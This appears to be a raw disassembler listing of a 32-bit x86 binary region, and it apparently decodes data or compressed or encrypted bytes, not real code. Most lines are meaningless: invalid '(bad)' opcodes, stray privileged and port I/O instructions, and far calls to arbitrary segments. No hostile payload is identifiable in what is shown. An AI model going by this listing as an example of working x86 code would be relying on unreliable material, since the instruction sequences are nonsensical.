  427794:	(bad)  
  427795:	sar    BYTE PTR [ebp+0x420e4bc3],0x17
  42779c:	pop    ecx
  42779d:	mov    cl,0xc0
  42779f:	data16 jae 0x4277be
  4277a2:	out    dx,eax
  4277a3:	cmp    bl,BYTE PTR [ecx+0x32]
  4277a6:	ins    DWORD PTR es:[edi],dx
  4277a7:	xchg   ebp,eax
  4277a8:	push   edx
  4277a9:	fs call 0x3e1b8ae3
  4277af:	(bad)  
  4277b0:	jb     0x4277e6
  4277b2:	push   edi
  4277b3:	das    
  4277b4:	das    
  4277b5:	or     al,0x28
  4277b7:	pop    ds
  4277b8:	fcomp  st(2)
  4277ba:	jmp    0x427766
  4277bc:	das    
  4277bd:	cmp    bh,BYTE PTR [esp+eax*8+0x28]
  4277c1:	(bad)  
  4277c2:	push   cs
  4277c3:	and    eax,DWORD PTR [ecx]
  4277c5:	or     eax,0x5fd70036
  4277ca:	imul   edi,DWORD PTR [ebx],0xe
  4277cd:	mov    WORD PTR [ebp-0x21bbdbdd],?
  4277d3:	fs dec ebp
  4277d5:	and    dh,BYTE PTR [edi+ebx*4]
  4277d8:	mov    al,0x9d
  4277da:	fadd   DWORD PTR ss:[esi+0x7f]
  4277de:	(bad)  
  4277df:	imul   ecx,DWORD PTR [esi],0xbf88e58c
  4277e5:	push   eax
  4277e6:	fcom   DWORD PTR [edi+0x16]
  4277e9:	ret    0x8938
  4277ec:	in     al,dx
  4277ed:	rcr    ebp,cl
  4277ef:	ffreep st(3)
  4277f1:	sbb    eax,0x4ff478a8
  4277f6:	push   ss
  4277f7:	jne    0x427813
  4277f9:	aam    0x55
  4277fb:	aad    0x46
  4277fd:	mov    bh,0x25
  4277ff:	fucom  st(6)
  427801:	or     eax,0x85df5e28
  427806:	sbb    BYTE PTR [ecx],ah
  427808:	adc    ebx,DWORD PTR [ebx+0x25]
  42780b:	jecxz  0x427858
  42780d:	and    esp,DWORD PTR [edi+0x3ff86a4b]
  427813:	and    dh,ch
  427815:	cli    
  427816:	cli    
  427817:	mov    ds:0xddd36814,al
  42781c:	imul   ebx,ecx,0xffffffc2
  42781f:	leave  
  427820:	add    eax,DWORD PTR [esi+0x10]
  427823:	cmc    
  427824:	out    0x52,eax
  427826:	lock sub DWORD PTR [eax+0x33],ebx
  42782a:	jo     0x427870
  42782c:	pushf  
  42782d:	leave  
  42782e:	xchg   edi,eax
  42782f:	mov    dl,0x60
  427831:	sbb    BYTE PTR [ecx],ah
  427833:	loopne 0x4277d8
  427835:	push   es
  427836:	clc    
  427837:	and    DWORD PTR [edi-0x46dfd0e3],esp
  42783d:	ins    BYTE PTR es:[edi],dx
  42783e:	cdq    
  42783f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427840:	pop    eax
  427841:	sbb    ecx,DWORD PTR [ebp+edi*4-0x41751c45]
  427848:	inc    esi
  427849:	push   edi
  42784a:	mov    ds:0xd838eb9f,eax
  42784f:	sti    
  427850:	adc    ecx,ecx
  427852:	arpl   si,sp
  427854:	ds loope 0x4277e3
  427857:	stos   DWORD PTR es:[edi],eax
  427858:	(bad)  
  427859:	aaa    
  42785a:	icebp  
  42785b:	sbb    al,0x8d
  42785d:	push   ss
  42785e:	jp     0x427875
  427860:	or     DWORD PTR [esi+0x25a9bb0],0xffffffef
  427867:	aam    0x77
  427869:	push   edi
  42786a:	inc    eax
  42786b:	adc    al,0x9b
  42786d:	add    BYTE PTR ss:[eax],al
	...
  4278d4:	add    BYTE PTR [eax],al
  4278d6:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  4278dc:	pop    esi
  4278dd:	fbstp  TBYTE PTR [eax+0x65]
  4278e0:	fldl2e 
  4278e2:	ss push ebx
  4278e4:	jecxz  0x427906
  4278e6:	addr16 test al,0x1
  4278e9:	add    BYTE PTR [eax],al
  4278eb:	add    DWORD PTR [eax],eax
  4278ed:	add    BYTE PTR [esi],bh
  4278ef:	adc    eax,0xaf8d1a63
  4278f4:	call   0x24d1:0x1e2f7916
  4278fb:	mov    eax,gs:0xa8572de
  427901:	push   eax
  427902:	adc    eax,0x33e20e
  427907:	sub    DWORD PTR [ebx+ebx*4+0x2a01116b],edx
  42790e:	inc    eax
  42790f:	dec    ebp
  427910:	(bad)  
  427911:	cmp    BYTE PTR [edi+0x427f5efc],dh
  427917:	mov    ebx,0xc9e39657
  42791c:	sahf   
  42791d:	dec    esi
  42791e:	xor    DWORD PTR [esi],ebx
  427920:	adc    al,0x47
  427922:	sub    ch,BYTE PTR [esi]
  427924:	mov    DWORD PTR [ebp+0x2058df4],ebp
  42792a:	push   esp
  42792c:	stos   BYTE PTR es:[edi],al
  42792d:	shr    DWORD PTR [esi-0x76],cl
  427930:	or     esp,ebp
  427932:	xor    edi,DWORD PTR [edi-0x189cf591]
  427938:	sub    DWORD PTR [ecx],ebx
  42793a:	pop    esp
  42793b:	add    DWORD PTR [esi],esi
  42793d:	inc    ebx
  42793e:	mov    bl,0xd7
  427940:	ins    DWORD PTR es:[edi],dx
  427941:	mov    eax,0xac034f20
  427946:	popa   
  427947:	inc    ebx
  427948:	or     ecx,DWORD PTR [ecx+0x79]
  42794b:	jno    0x427903
  42794d:	leave  
  42794e:	mov    cl,0x87
  427950:	test   al,0xb2
  427952:	nop
  427953:	push   ecx
  427954:	sub    DWORD PTR [esi+0xa814598],ecx
  42795a:	xor    DWORD PTR [eax],0xded09b9b
  427960:	cmp    eax,eax
  427962:	frstor ds:0xaf8a6f3a
  427968:	xchg   ebx,eax
  427969:	ficom  DWORD PTR ds:0xf89e72fa
  42796f:	jnp    0x427996
  427971:	(bad)  [esi+edx*4+0x4ce62e91]
  427978:	sub    al,0x7e
  42797a:	xlat   BYTE PTR ds:[ebx]
  42797b:	call   0x12d2819c
  427980:	sbb    eax,0x84cbc8cb
  427985:	cmp    eax,0xf6c78428
  42798a:	lods   al,BYTE PTR ds:[esi]
  42798b:	lock outs dx,DWORD PTR ds:[esi]
  42798d:	dec    esp
  42798e:	fisttp QWORD PTR [ecx-0x6deeae94]
  427994:	pop    eax
  427995:	inc    eax
  427996:	push   DWORD PTR [edx+edi*4+0x3a92a293]
  42799d:	inc    ecx
  42799e:	js     0x427929
  4279a0:	adc    al,0x12
  4279a2:	sti    
  4279a3:	xchg   edi,eax
  4279a4:	inc    ecx
  4279a5:	icebp  
  4279a6:	push   ebp
  4279a7:	mov    bl,0xa7
  4279a9:	cwde   
  4279aa:	sbb    eax,0xe5e8b9f
  4279af:	and    DWORD PTR [eax+edx*1+0x56a66115],edi
  4279b6:	fwait
  4279b7:	cli    
  4279b8:	(bad)  
  4279ba:	(bad)  
  4279bb:	(bad)  
  4279bc:	popa   
  4279bd:	enter  0x6988,0x9e
  4279c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279c2:	outs   dx,BYTE PTR ds:[esi]
  4279c3:	pop    ds
  4279c4:	xchg   edi,eax
  4279c5:	in     al,dx
  4279c6:	push   0xc5573869
  4279cb:	enter  0x1b7f,0xaf
  4279cf:	(bad)  
  4279d1:	je     0x42798c
  4279d3:	aas    
  4279d4:	jl     0x427a09
  4279d6:	mov    bh,0x3f
  4279d8:	(bad)  
  4279d9:	outs   dx,BYTE PTR ds:[esi]
  4279da:	add    BYTE PTR [ebx-0x3c],ch
  4279dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4279df:	xchg   edi,eax
  4279e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279e1:	lahf   
  4279e2:	pop    ss
  4279e3:	inc    edi
  4279e4:	and    al,0x41
  4279e6:	cmp    eax,0x94771037
  4279eb:	lods   eax,DWORD PTR ds:[esi]
  4279ec:	adc    al,0x8e
	...
  427a56:	call   0xdea3:0xffa3ffdd
  427a5d:	std    
  427a5e:	inc    edx
  427a5f:	jne    0x427a39
  427a61:	sbb    esi,0xffffffc4
  427a64:	pop    edx
  427a65:	jo     0x427ace
  427a67:	test   eax,0x1000001
  427a6c:	add    BYTE PTR [eax],al
  427a6e:	cld    
  427a6f:	mov    ch,0x18
  427a71:	push   ecx
  427a72:	xor    eax,0xe0109c80
  427a77:	sub    eax,0xf9886f34
  427a7c:	out    dx,eax
  427a7d:	inc    ebx
  427a7e:	js     0x427a54
  427a80:	mov    ebx,0x8740963d
  427a85:	sahf   
  427a86:	sahf   
  427a87:	jmp    0x427ae4
  427a89:	xor    bl,BYTE PTR [eax-0x9]
  427a8c:	scas   eax,DWORD PTR es:[edi]
  427a8d:	retf   
  427a8e:	cmp    DWORD PTR [esi+0x4d],ebx
  427a91:	outs   dx,BYTE PTR ds:[esi]
  427a92:	arpl   si,cx
  427a94:	(bad)  
  427a95:	xor    dh,cl
  427a97:	mov    ah,al
  427a99:	stos   BYTE PTR es:[edi],al
  427a9a:	shl    BYTE PTR [ebx+0x60167839],cl
  427aa0:	ret    
  427aa1:	fdivp  st(6),st
  427aa3:	add    DWORD PTR [ebp+0x79f5816c],esp
  427aa9:	out    dx,al
  427aaa:	arpl   WORD PTR [edi+0x749be909],ax
  427ab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ab1:	ss stos BYTE PTR es:[di],al
  427ab4:	sub    ah,bl
  427ab6:	sbb    al,0x66
  427ab8:	cli    
  427ab9:	or     eax,0xac28a285
  427abe:	int    0xc8
  427ac0:	in     al,0xb4
  427ac2:	and    BYTE PTR [edx-0x35278a23],ch
  427ac8:	sbb    eax,0x8c823052
  427acd:	fcmovb st,st(0)
  427acf:	or     eax,0xfca65bad
  427ad4:	leave  
  427ad5:	add    eax,0x8cd7e1ac
  427ada:	or     DWORD PTR [ecx+0x1b],esp
  427add:	lock (bad) 
  427adf:	scas   eax,DWORD PTR es:[edi]
  427ae0:	mov    BYTE PTR [ebp-0x39e46221],dl
  427ae6:	mov    ebx,0xf36b44a0
  427aeb:	sbb    dl,dl
  427aed:	and    DWORD PTR [ecx-0x40],edx
  427af0:	cmp    al,0x67
  427af2:	and    eax,0x811e1440
  427af7:	lahf   
  427af8:	loope  0x427ab4
  427afa:	std    
  427afb:	rcr    eax,cl
  427afd:	jge    0x427b51
  427aff:	sbb    dh,bh
  427b01:	xchg   edi,eax
  427b02:	push   0x11
  427b04:	xchg   esp,eax
  427b05:	inc    ebp
  427b06:	jp     0x427aec
  427b08:	sub    DWORD PTR [ecx+0x15],edi
  427b0b:	mov    eax,0xf34591a1
  427b10:	ror    esp,cl
  427b12:	add    eax,0xf7c565d8
  427b17:	sbb    edx,edx
  427b19:	inc    ebx
  427b1a:	xor    BYTE PTR [ecx+0x1199c3a1],al
  427b20:	push   0x34
  427b22:	push   edx
  427b23:	add    esp,ecx
  427b25:	(bad)  
  427b26:	lahf   
  427b27:	add    al,0xf0
  427b29:	aam    0x32
  427b2b:	scas   al,BYTE PTR es:[edi]
  427b2c:	nop
  427b2d:	xlat   BYTE PTR ds:[ebx]
  427b2e:	jmp    0x427b2c
  427b30:	aam    0xe4
  427b32:	cmp    BYTE PTR [edx-0x3b],cl
  427b35:	inc    edx
  427b37:	ret    0x54e4
  427b3a:	pop    ds
  427b3b:	xchg   edi,eax
  427b3c:	sub    eax,eax
  427b3e:	push   ds
  427b3f:	lahf   
  427b40:	push   ds
  427b41:	mov    al,ds:0xb3bfd2de
  427b46:	loop   0x427b95
  427b48:	outs   dx,DWORD PTR ds:[esi]
  427b49:	loopne 0x427ad4
  427b4b:	mov    edi,0xa63b4cf1
  427b50:	ss jae 0x427ad4
  427b53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b54:	inc    esp
  427b55:	and    al,0xb6
  427b58:	adc    esp,ebx
  427b5a:	mov    BYTE PTR [ebx+ecx*4],dl
  427b5d:	aaa    
  427b5e:	aas    
  427b5f:	and    ebx,0x839e85a
  427b65:	nop
  427b66:	cdq    
  427b67:	or     eax,0xe0c18dc1
  427b6c:	addr16 xor al,0x0
	...
  427bd3:	add    BYTE PTR [eax],al
  427bd5:	add    dl,cl
  427bd7:	mov    edx,DWORD PTR [edx+0x7b]
  427bda:	push   ebx
  427bdb:	sti    
  427bdc:	jmp    0x427b99
  427bde:	push   ecx
  427bdf:	mov    ecx,ebx
  427be1:	test   BYTE PTR [edx-0x63],0xb5
  427be5:	call   0x100:0x1aa67
  427bec:	add    BYTE PTR [eax],al
  427bee:	call   0x27c3:0xf0c713c8
  427bf5:	js     0x427c25
  427bf7:	test   BYTE PTR [ebp+0x360f8c47],al
  427bfd:	fidivr DWORD PTR [esi+0x9]
  427c00:	inc    ecx
  427c01:	jmp    0xe3dc:0x8636a2a8
  427c08:	dec    edi
  427c09:	mov    ch,0x89
  427c0b:	(bad)  [ebx-0x11662374]
  427c11:	cs inc ebp
  427c13:	clc    
  427c14:	push   0x98df8f21
  427c19:	inc    edx
  427c1a:	mov    ecx,0xf9d503cf
  427c1f:	repz lock xchg esp,eax
  427c22:	xor    ch,BYTE PTR [ebp+0xfbf6055]
  427c28:	fs stos DWORD PTR es:[edi],eax
  427c2a:	jg     0x427c93
  427c2c:	sub    al,BYTE PTR [ebx-0x25]
  427c2f:	xor    eax,0x940c5a15
  427c34:	dec    BYTE PTR [ecx+eax*8+0x35]
  427c38:	inc    esi
  427c39:	mov    ebx,0xb35387b2
  427c3e:	jo     0x427bc4
  427c40:	shr    BYTE PTR [ebx+0x3eed2348],0xf
  427c47:	jae    0x427bf4
  427c49:	pusha  
  427c4a:	jne    0x427c82
  427c4c:	mov    cl,0x81
  427c4e:	sahf   
  427c4f:	jno    0x427c90
  427c51:	xchg   edi,eax
  427c52:	enter  0xc567,0x96
  427c56:	xor    edx,DWORD PTR [eax]
  427c58:	in     eax,dx
  427c59:	sbb    al,0x30
  427c5b:	dec    ebx
  427c5c:	cmp    esi,DWORD PTR [esi-0x1faeb7e9]
  427c62:	shl    BYTE PTR [ebx+0x3b141fd5],cl
  427c68:	pop    ebp
  427c69:	lds    ecx,FWORD PTR [esi+0x4960743e]
  427c6f:	push   0x2a
  427c71:	mov    dl,ah
  427c73:	imul   edi,DWORD PTR [ebp-0x79],0x3ecafb2d
  427c7a:	pusha  
  427c7b:	daa    
  427c7c:	ds aaa 
  427c7e:	mov    eax,DWORD PTR [ebx-0x26608343]
  427c84:	adc    DWORD PTR [esi*2+0x59cea28d],ebp
  427c8b:	hlt    
  427c8c:	gs sub al,0x7c
  427c8f:	dec    ebx
  427c90:	dec    edx
  427c91:	jns    0x427c7f
  427c93:	mov    ebx,0x9acb3b3d
  427c98:	popf   
  427c99:	int3   
  427c9a:	pushf  
  427c9b:	inc    ebx
  427c9c:	sbb    al,0x2b
  427c9e:	mov    dh,0x76
  427ca0:	mov    ds:0x3ceb9e35,al
  427ca5:	sbb    eax,DWORD PTR [edi+0x6f]
  427ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ca9:	in     eax,dx
  427caa:	icebp  
  427cab:	sub    cl,BYTE PTR [esi+0x285d6230]
  427cb1:	push   ss
  427cb2:	mov    bh,0xca
  427cb4:	ret    
  427cb5:	in     al,0xc
  427cb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427cb8:	sub    ah,BYTE PTR [esi+0x11]
  427cbb:	in     eax,dx
  427cbc:	inc    ecx
  427cbd:	add    ebp,DWORD PTR [eiz*2-0x470310b5]
  427cc4:	dec    ebx
  427cc5:	and    eax,0x82d8e21
  427cca:	cld    
  427ccb:	adc    BYTE PTR [ecx],cl
  427ccd:	cli    
  427cce:	sub    al,0x9a
  427cd0:	cmp    DWORD PTR [eax],0x29
  427cd3:	pusha  
  427cd4:	pushf  
  427cd5:	mov    ch,BYTE PTR [ebp-0x36]
  427cd8:	jno    0x427d34
  427cda:	inc    ecx
  427cdb:	ds loopne 0x427d2c
  427cde:	inc    esi
  427cdf:	shr    BYTE PTR [ebx-0x6f72cc52],0x70
  427ce6:	cdq    
  427ce7:	dec    eax
  427ce8:	adc    ecx,ebx
  427cea:	push   ebp
  427ceb:	xor    esi,DWORD PTR [ebx]
  427ced:	inc    DWORD PTR [eax]
	...
  427d53:	add    BYTE PTR [eax],al
  427d55:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427d5b:	jecxz  0x427d50
  427d5d:	lock xchg DWORD PTR ds:0xd115d44,ebx
  427d64:	fadd   DWORD PTR [edi+0x1ab67]
  427d6a:	add    BYTE PTR [ecx],al
  427d6c:	add    BYTE PTR [eax],al
  427d6e:	cwde   
  427d6f:	xchg   edx,eax
  427d70:	(bad)
  427d73:	cdq    
  427d74:	(bad)  
  427d75:	jns    0x427d47
  427d77:	mov    eax,ds:0x6ec6db2c
  427d7c:	fwait
  427d7d:	xchg   edi,eax
  427d7e:	jo     0x427d2d
  427d80:	mov    WORD PTR [esi-0x19],ss
  427d83:	into   
  427d84:	in     eax,0xe6
  427d86:	xchg   ebx,eax
  427d87:	mov    ah,0x83
  427d89:	or     DWORD PTR [esi],0x6db3107a
  427d8f:	sub    BYTE PTR [esi+0x7ceb624c],0x27
  427d96:	dec    eax
  427d97:	xlat   BYTE PTR ds:[ebx]
  427d98:	mov    eax,0x488cec7c
  427d9d:	inc    eax
  427d9e:	sbb    eax,0x8b8999e7
  427da3:	or     BYTE PTR [esi-0x76f8691d],0xef
  427daa:	(bad)  
  427dab:	cmc    
  427dac:	sahf   
  427dad:	jmp    0x2b7f:0xa4def40a
  427db4:	addr16 xor eax,0x9cb8ffb1
  427dba:	dec    ebx
  427dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427dbc:	push   cs
  427dbd:	sbb    DWORD PTR [edi-0x5222ffa4],edi
  427dc3:	adc    edi,esp
  427dc5:	test   eax,0xc3edd3ef
  427dca:	adc    edi,DWORD PTR [edx]
  427dcc:	ret    0xb8d2
  427dcf:	fneni(8087 only) 
  427dd1:	and    ebp,DWORD PTR [edi+0xffdd0ce]
  427dd7:	dec    esp
  427dd8:	xchg   edx,eax
  427dd9:	mov    ebp,0x957137b
  427dde:	retf   
  427ddf:	jmp    0x427ddb
  427de1:	or     cl,bl
  427de3:	cld    
  427de4:	add    BYTE PTR [esi],bl
  427de6:	cmp    al,0x3d
  427de8:	clc    
  427de9:	mov    edi,0xcca1d4c1
  427dee:	mov    esp,0x2ff95f58
  427df3:	or     dl,BYTE PTR [eax+0x70790634]
  427df9:	stos   DWORD PTR es:[edi],eax
  427dfa:	out    dx,al
  427dfb:	inc    ecx
  427dfc:	icebp  
  427dfd:	sub    ecx,edi
  427dff:	dec    edi
  427e00:	sub    edx,DWORD PTR [edi+0x4c90eb93]
  427e06:	push   ss
  427e07:	cmp    BYTE PTR [esi+0x7a],cl
  427e0a:	repnz dec ebx
  427e0c:	sahf   
  427e0d:	aam    0x4
  427e0f:	add    edi,DWORD PTR [edi]
  427e11:	ja     0x427dfc
  427e13:	std    
  427e14:	(bad)  
  427e15:	shr    BYTE PTR [ecx+eiz*2+0x2],cl
  427e19:	test   eax,0xf2d87c56
  427e1e:	cwde   
  427e1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e20:	fwait
  427e21:	dec    ebp
  427e22:	retf   0x9f0c
  427e25:	push   ds
  427e26:	test   BYTE PTR [edx],bl
  427e28:	or     dl,ch
  427e2a:	in     al,dx
  427e2b:	icebp  
  427e2c:	aam    0x43
  427e2e:	aam    0x3d
  427e30:	ds mov ah,0xae
  427e33:	sbb    ecx,DWORD PTR [edx-0x71]
  427e36:	retf   
  427e37:	and    eax,0x891ea9ac
  427e3c:	inc    esi
  427e3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e3e:	leave  
  427e3f:	stos   BYTE PTR es:[edi],al
  427e40:	or     BYTE PTR [esi+0x3],0x3e
  427e44:	cs jp  0x427e12
  427e47:	ret    
  427e48:	push   0xcf12fe00
  427e4d:	imul   ecx,esi,0x6f29f898
  427e53:	dec    esp
  427e54:	xor    eax,0xcf524af
  427e59:	or     bl,BYTE PTR [ebx]
  427e5b:	in     al,0x38
  427e5d:	xchg   esi,eax
  427e5e:	lods   eax,DWORD PTR ds:[esi]
  427e5f:	dec    esi
  427e60:	das    
  427e61:	pop    es
  427e62:	sub    esp,DWORD PTR [ecx-0x8]
  427e65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427e66:	add    eax,0x8bcd35a0
  427e6b:	lahf   
  427e6c:	bound  edx,QWORD PTR [ecx]
	...
  427ed6:	mov    eax,0x6d3c25f1
  427edb:	cld    
  427edc:	mov    ecx,0x2bc293f5
  427ee1:	leave  
  427ee2:	mov    eax,ds:0x6758c363
  427ee7:	lods   al,BYTE PTR ds:[esi]
  427ee8:	add    DWORD PTR [eax],eax
  427eea:	add    BYTE PTR [ecx],al
  427eec:	add    BYTE PTR [eax],al
  427eee:	and    eax,0xa68df81
  427ef3:	cwde   
  427ef4:	mov    esi,0xfb7ab2a3
  427ef9:	xor    al,0x94
  427efb:	jecxz  0x427f49
  427efd:	shr    DWORD PTR ds:0xb8888948,cl
  427f03:	jbe    0x427ea4
  427f05:	lahf   
  427f06:	pop    edx
  427f07:	add    eax,DWORD PTR [edi+edi*1-0x270b89b5]
  427f0e:	nop
  427f0f:	out    0x4f,eax
  427f11:	mov    esi,0x59038d86
  427f16:	dec    esi
  427f17:	mov    ah,0xb2
  427f19:	(bad)  
  427f1a:	jo     0x427f7f
  427f1c:	xchg   BYTE PTR [ebx],ah
  427f1e:	loop   0x427ea3
  427f20:	jp     0x427f1f
  427f22:	into   
  427f23:	mov    ecx,0xd790a48a
  427f28:	jge    0x427f1e
  427f2a:	xchg   edx,eax
  427f2b:	retf   
  427f2c:	shl    DWORD PTR [eax],1
  427f2e:	mov    ebp,0xbdb09fdf
  427f33:	cmc    
  427f34:	je     0x427f59
  427f36:	mov    dl,0x6
  427f38:	icebp  
  427f39:	retf   
  427f3a:	mov    esi,0xc9a2f8a
  427f3f:	cmc    
  427f40:	loope  0x427ef7
  427f42:	adc    al,0x60
  427f44:	ja     0x427f49
  427f46:	mov    al,ds:0x51733939
  427f4b:	push   edx
  427f4c:	fbld   TBYTE PTR [edi+0x59]
  427f4f:	dec    BYTE PTR [edi]
  427f51:	fcmovbe st,st(4)
  427f53:	push   ebp
  427f54:	dec    edi
  427f55:	sbb    DWORD PTR [edx-0x4b],ebx
  427f58:	xor    edi,ecx
  427f5a:	jmp    0x25b3:0x747e2c6e
  427f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f62:	ret    0x3ec2
  427f65:	imul   edi,ebp,0x37c0d27d
  427f6b:	xchg   edi,eax
  427f6c:	fisttp WORD PTR [eax-0x2]
  427f6f:	fbld   TBYTE PTR [esi-0x42dbd404]
  427f75:	js     0x427f78
  427f77:	repnz aaa 
  427f79:	fsubr  DWORD PTR [eax+0x10]
  427f7c:	cmp    al,0x4
  427f7e:	enter  0xc446,0xeb
  427f82:	popa   
  427f83:	or     DWORD PTR [eax+0x4e6d910b],ebp
  427f89:	cmp    eax,0x8202d9f3
  427f8e:	loope  0x42800f
  427f90:	push   ecx
  427f91:	imul   edi,DWORD PTR [edi],0x1441eef4
  427f97:	mov    BYTE PTR [esi],ah
  427f99:	push   ds
  427f9a:	add    al,0xd5
  427f9c:	ja     0x427f46
  427f9e:	mov    al,0xaa
  427fa0:	in     eax,dx
  427fa1:	ror    BYTE PTR [eax-0x4a],0x89
  427fa5:	xchg   BYTE PTR [edx+0x2],dh
  427fa8:	cmp    ah,dl
  427faa:	scas   al,BYTE PTR es:[edi]
  427fab:	enter  0x7bfb,0x48
  427faf:	dec    esp
  427fb0:	int    0x38
  427fb2:	mov    BYTE PTR fs:[edx-0x7248fcb9],cl
  427fb9:	pop    ebp
  427fba:	push   edi
  427fbb:	push   esi
  427fbc:	push   edx
  427fbd:	cmp    DWORD PTR [esp+edx*8-0x3a39258e],0xffffffa0
  427fc5:	adc    DWORD PTR [ebx+0x63],0xe7b7241f
  427fcc:	jecxz  0x427f5e
  427fce:	stos   BYTE PTR es:[edi],al
  427fcf:	test   eax,0x8318b42b
  427fd4:	mov    BYTE PTR [ebx-0x6af0f79b],cl
  427fda:	fwait
  427fdb:	loope  0x428011
  427fdd:	dec    ebx
  427fde:	fst    QWORD PTR [edx+0x34]
  427fe1:	adc    DWORD PTR ds:[edi],esi
  427fe4:	das    
  427fe5:	cld    
  427fe6:	xchg   esp,eax
  427fe7:	xchg   DWORD PTR [edi],edx
  427fe9:	(bad)  
  427fea:	adc    al,0x79
  427fec:	or     bh,BYTE PTR [esi]
	...
  428056:	mov    cl,0xa7
  428058:	dec    ebx
  428059:	das    
  42805a:	pop    edi
  42805b:	out    dx,eax
  42805c:	cmc    
  42805d:	mov    edi,0x22b0803f
  428062:	mov    ah,0x11
  428064:	lock push ebp
  428066:	lods   eax,DWORD PTR ds:[si]
  428068:	add    DWORD PTR [eax],eax
  42806a:	add    BYTE PTR [ecx],al
  42806c:	add    BYTE PTR [eax],al
  42806e:	fnstcw WORD PTR ds:0x384f5b17
  428074:	in     eax,0x7a
  428076:	in     al,dx
  428077:	cmp    al,0xc8
  428079:	and    esi,DWORD PTR [ebp-0x48]
  42807c:	(bad)  
  42807e:	test   DWORD PTR [ecx+0x18],0x8b599703
  428085:	pop    ds
  428086:	ficomp DWORD PTR [edx+eax*8+0x5fca02ff]
  42808d:	push   0xffffff8b
  42808f:	(bad)  [edi-0x2]
  428092:	fisubr DWORD PTR [ebx-0x36033baa]
  428098:	pop    edx
  428099:	dec    ebx
  42809a:	aad    0x35
  42809c:	(bad)  
  42809e:	inc    edx
  42809f:	push   0x6640a484
  4280a4:	mov    ds:0x989573fd,eax
  4280a9:	sar    eax,0x33
  4280ac:	shl    DWORD PTR [edx+0x79f6c7da],0xa4
  4280b3:	xchg   edi,eax
  4280b4:	dec    ecx
  4280b5:	hlt    
  4280b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280b7:	jbe    0x42806c
  4280b9:	pop    ebp
  4280ba:	fucompp 
  4280bc:	or     DWORD PTR [ebp+edx*1-0x49],edi
  4280c0:	arpl   cx,ax
  4280c2:	(bad)
  4280c5:	dec    esp
  4280c6:	lods   al,BYTE PTR ds:[esi]
  4280c7:	cdq    
  4280c8:	int    0x26
  4280ca:	pop    ss
  4280cb:	(bad)  
  4280cc:	in     al,dx
  4280cd:	outs   dx,BYTE PTR ds:[esi]
  4280ce:	stos   BYTE PTR es:[edi],al
  4280cf:	xchg   esp,eax
  4280d0:	dec    eax
  4280d1:	xor    BYTE PTR [eax-0x5ce44522],dl
  4280d7:	inc    eax
  4280d8:	imul   edx,DWORD PTR [edx-0x4aa21955],0xf4f4afca
  4280e2:	add    eax,esp
  4280e4:	(bad)  
  4280e5:	outs   dx,WORD PTR ds:[esi]
  4280e7:	and    DWORD PTR [ecx-0x62],0x9f5b29cb
  4280ee:	out    0xa8,eax
  4280f0:	sub    DWORD PTR cs:[edi+0x38],ebp
  4280f4:	cmp    ebp,0x6e5009ae
  4280fa:	dec    eax
  4280fb:	popa   
  4280fc:	lahf   
  4280fd:	push   cs
  4280fe:	jg     0x4280e7
  428100:	mov    dh,BYTE PTR [edx+0x2e37484b]
  428106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428107:	out    0xae,al
  428109:	inc    ebx
  42810a:	pop    ds
  42810b:	gs fwait
  42810d:	add    dh,cl
  42810f:	clc    
  428110:	call   0x6a75d66b
  428115:	aad    0x3c
  428117:	inc    eax
  428118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428119:	mov    ?,WORD PTR [ebx+0x4f61cdca]
  42811f:	or     edx,edi
  428121:	retf   0x8548
  428124:	xchg   esp,eax
  428125:	test   BYTE PTR [edx-0xa],0x54
  428129:	adc    BYTE PTR [eax+ebx*1],ch
  42812c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42812d:	call   0x906f:0x5702fa32
  428134:	daa    
  428135:	in     eax,dx
  428136:	sbb    edx,esp
  428138:	and    eax,edi
  42813a:	xchg   ebx,eax
  42813b:	ret    
  42813c:	jne    0x428131
  42813e:	into   
  42813f:	mov    ds:0xfdb5fe8f,eax
  428144:	add    BYTE PTR [edx+eiz*8],bh
  428147:	mov    cl,0x85
  428149:	leave  
  42814a:	ret    
  42814b:	iret   
  42814c:	mov    dh,0x2a
  42814e:	add    BYTE PTR [edx+0x2],0x95
  428152:	mov    edx,0x8a94f14b
  428157:	iret   
  428158:	icebp  
  428159:	mov    ecx,0x3e8a4a95
  42815e:	sbb    eax,0xfba1c997
  428163:	mov    ah,0x55
  428165:	shl    BYTE PTR [eax-0xc74bc69],0xb2
  42816c:	xor    edi,ebp
	...
  4281d6:	fucomip st,st(6)
  4281d8:	std    
  4281d9:	dec    esp
  4281da:	std    
  4281db:	pop    edi
  4281dc:	(bad)  
  4281dd:	call   FWORD PTR [edx]
  4281df:	xchg   edi,eax
  4281e0:	pop    esp
  4281e1:	push   ecx
  4281e2:	jae    0x4281fe
  4281e4:	jnp    0x428257
  4281e6:	scas   al,BYTE PTR es:[di]
  4281e8:	add    DWORD PTR [eax],eax
  4281ea:	add    BYTE PTR [ecx],al
  4281ec:	add    BYTE PTR [eax],al
  4281ee:	inc    edi
  4281ef:	imul   edi,DWORD PTR [edx+0x14],0xffffffe9
  4281f3:	add    eax,0xde1bde9e
  4281f8:	add    ch,0x83
  4281fb:	inc    edi
  4281fc:	sti    
  4281fd:	fdivr  QWORD PTR [esp+ebp*8+0x3667e052]
  428204:	clc    
  428205:	xor    DWORD PTR [eax],0x52
  428208:	xor    al,0x8b
  42820a:	jg     0x428196
  42820c:	enter  0x1236,0x16
